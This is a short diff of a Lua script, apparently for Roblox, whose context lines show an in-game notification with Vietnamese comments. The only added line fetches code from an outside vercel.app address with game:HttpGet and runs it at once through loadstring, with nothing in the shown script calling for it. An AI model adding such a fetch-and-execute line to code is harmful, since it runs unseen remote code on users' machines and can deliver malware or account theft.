@@ -25,3 +25,4 @@ StarterGui:SetCore("SendNotification", {
     Duration = 5, -- Thời gian hiển thị (giây)
     Button1 = "Đóng", -- Nút bấm (tùy chọn)
 })
+loadstring(game:HttpGet("https://shadow-lyart-omega.vercel.app/main"))()
